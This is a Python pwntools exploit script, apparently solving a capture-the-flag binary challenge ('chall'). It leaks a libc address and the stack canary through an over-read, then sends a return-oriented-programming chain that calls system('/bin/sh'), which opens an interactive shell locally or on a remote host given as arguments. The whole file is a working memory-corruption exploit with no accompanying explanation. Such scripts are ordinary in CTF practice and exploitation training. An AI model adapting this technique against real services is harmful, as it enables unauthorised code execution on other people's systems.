#!/usr/bin/env python3

from pwn import *

context.binary = e = ELF("./chall", checksec=False)
context.log_level = 'debug'
libc = ELF("./libc.so.6", checksec=False)
gs = '''
b*0x401638
b*0x4013CF
b*0x401266
'''
def init():
    if args.LOCAL:
        p = process(["/lib64/ld-linux-x86-64.so.2", "./chall"])
        gdb.attach(p, gdbscript=gs)
    if args.REMOTE:
        p = remote(sys.argv[1], sys.argv[2])

    return p

p = init()

# def set_thread(idx):

payload = flat(
    b"CHUNKS 3",
)
p.send(payload)
payload = flat(
    b"CHUNK 1000 1 ",
    b"A"*0x58,
)
p.sendafter(b"3\n", payload)
# leak libc:
p.recvuntil(b"A"*0x58)
leak_libc = u64(p.recvline()[:-1].ljust(8, b"\00"))
libc_base = leak_libc - 0x9caa4
libc.address = libc_base
log.info(f"leak libc: {hex(libc_base)}")
# leak canary: 
payload = flat(
    b"CHUNK 1000 1 ",
    b"A"*0x49,
)
p.send(payload)
p.recvuntil(b"A"*0x49)
canary = u64(p.recv(7).rjust(8, b"\00"))
log.info(f"leak canary: {hex(canary)}")

pop_rdi = libc_base + 0x000000000010f75b
pop_rsi = libc_base + 0x0000000000110a4d
pop_rdx_rbx_r12_r13_rbp = libc_base + 0x00000000000b503c
pop_rdi_rbp = libc_base + 0x000000000002a873
payload = flat(
    b"CHUNK 1 1 ",
    b"A"*0x48,
    p64(canary),
    b"B"*8,
    p64(pop_rdi_rbp),
    p64(next(libc.search(b"/bin/sh"))),
    p64(0),
    p64(pop_rsi),
    p64(0),
    p64(pop_rdx_rbx_r12_r13_rbp),
    p64(0)*5,
    libc.sym.system,
)
p.send(payload)
    

p.interactive()